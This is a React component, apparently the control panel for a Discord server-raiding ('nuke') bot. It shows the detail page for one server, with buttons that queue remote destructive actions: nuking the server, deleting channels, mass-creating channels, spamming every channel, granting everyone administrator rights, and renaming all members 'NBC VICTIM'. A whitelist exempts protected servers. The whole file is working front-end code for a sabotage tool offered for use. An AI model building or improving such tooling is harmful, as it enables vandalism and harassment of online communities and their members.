import { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import { Rocket, Trash2, Plus, Shield, LogOut, Loader2, RefreshCw } from 'lucide-react';
import { api } from '../../lib/api';
import { Card, Loader, Badge } from '../../components/ui';
import { useAuth } from '../../context/AuthContext';
import { nf, timeAgo } from '../../lib/format';

const ACTIONS = [
  { key: 'nuke', label: 'Nuke', icon: Rocket, tone: 'danger', args: {} },
  { key: 'delete_channels', label: 'Delete Channels', icon: Trash2, tone: 'ghost', args: {} },
  { key: 'create_channels', label: 'Create Channels', icon: Plus, tone: 'ghost', args: { count: 20 } },
  { key: 'spam_all', label: 'Spam All', icon: RefreshCw, tone: 'ghost', args: { count: 3 } },
  { key: 'admin_all', label: 'Admin Everyone', icon: Shield, tone: 'ghost', args: {} },
  { key: 'nick_all', label: 'Nickname All', icon: RefreshCw, tone: 'ghost', args: { nick: 'NBC VICTIM' } },
];

export default function ServerDetail() {
  const { guildId } = useParams();
  const { user } = useAuth();
  const [data, setData] = useState(null);
  const [busy, setBusy] = useState(null);
  const [toast, setToast] = useState(null);

  const load = () => api.get('/api/guilds/' + guildId).then((d) => setData(d.data)).catch(() => setData(false));
  useEffect(() => { load(); }, [guildId]);

  const run = async (action, args) => {
    setBusy(action);
    setToast(null);
    try {
      // FIX: leave ka apna owner-only route hai, /execute pe bhejne se wo dead code tha
      const r = action === 'leave'
        ? await api.post('/api/guilds/' + guildId + '/leave')
        : await api.post('/api/guilds/' + guildId + '/execute', { action, args });

      setToast({ ok: true, msg: action + ' queued (' + r.jobId + ')' });
      setTimeout(load, 4000);
    } catch (e) {
      setToast({ ok: false, msg: e.message });
    } finally {
      setBusy(null);
    }
  };

  const toggleWhitelist = async () => {
    const on = (data && data.isWhitelisted) || (data && data.live && data.live.whitelisted);
    try {
      if (on) await api.delete('/api/guilds/' + guildId + '/whitelist');
      else await api.post('/api/guilds/' + guildId + '/whitelist');
      setToast({ ok: true, msg: on ? 'Whitelist removed' : 'Server protected' });
      load();
    } catch (e) {
      setToast({ ok: false, msg: e.message });
    }
  };

  if (data === null) return <Loader />;
  if (data === false) return <p className="text-muted">Server not found.</p>;

  const isProtected = data.isWhitelisted || (data.live && data.live.whitelisted);

  return (
    <div className="space-y-6">
      <div className="flex flex-wrap items-center gap-4">
        <div className="h-16 w-16 overflow-hidden rounded-2xl border border-edge bg-surface">
          {data.icon && <img src={data.icon} alt="" className="h-full w-full object-cover" />}
        </div>
        <div className="flex-1">
          <h1 className="font-display text-2xl font-bold">{data.name}</h1>
          <p className="text-sm text-muted">
            {nf(data.memberCount)} members - {nf(data.channelCount)} channels - ID {data.guildId}
          </p>
        </div>
        {isProtected && <Badge tone="green">Protected</Badge>}
        {data.live && <Badge tone="purple">Live</Badge>}
      </div>

      {toast && (
        <div className={'card p-3 text-sm ' + (toast.ok ? 'text-emerald-300' : 'text-red-300')}>{toast.msg}</div>
      )}

      <Card>
        <h2 className="font-display font-semibold">Remote Actions</h2>
        <p className="mt-1 text-xs text-muted">Only global admins can execute.</p>
        <div className="mt-4 grid gap-2.5 sm:grid-cols-3">
          {ACTIONS.map((a) => (
            <button
              key={a.key}
              disabled={busy || !user.isAdmin}
              onClick={() => run(a.key, a.args)}
              className={(a.tone === 'danger' ? 'btn-danger' : 'btn-ghost') + ' justify-start'}
            >
              {busy === a.key ? <Loader2 size={16} className="animate-spin" /> : <a.icon size={16} />}
              {a.label}
            </button>
          ))}
        </div>

        <div className="mt-4 flex flex-wrap gap-2.5 border-t border-edge pt-4">
          <button onClick={toggleWhitelist} disabled={!user.isAdmin} className="btn-ghost">
            <Shield size={16} /> {isProtected ? 'Unprotect' : 'Protect from nuke'}
          </button>
          <button onClick={() => run('leave', {})} disabled={!user.isOwner} className="btn-ghost">
            <LogOut size={16} /> Make bot leave
          </button>
        </div>
      </Card>

      <Card>
        <h2 className="font-display font-semibold">Recent Actions</h2>
        <div className="mt-3 space-y-2">
          {(data.actions || []).map((a) => (
            <div key={a._id} className="flex items-center justify-between rounded-xl border border-edge bg-surface/40 p-3 text-sm">
              <span className="font-medium">{a.action}</span>
              <div className="flex items-center gap-3">
                <span className="text-xs text-muted">{a.requestedByName} - {timeAgo(a.createdAt)}</span>
                <Badge tone={a.status === 'done' ? 'green' : a.status === 'failed' ? 'red' : 'amber'}>{a.status}</Badge>
              </div>
            </div>
          ))}
          {(!data.actions || data.actions.length === 0) && <p className="text-sm text-muted">No actions yet.</p>}
        </div>
      </Card>
    </div>
  );
}
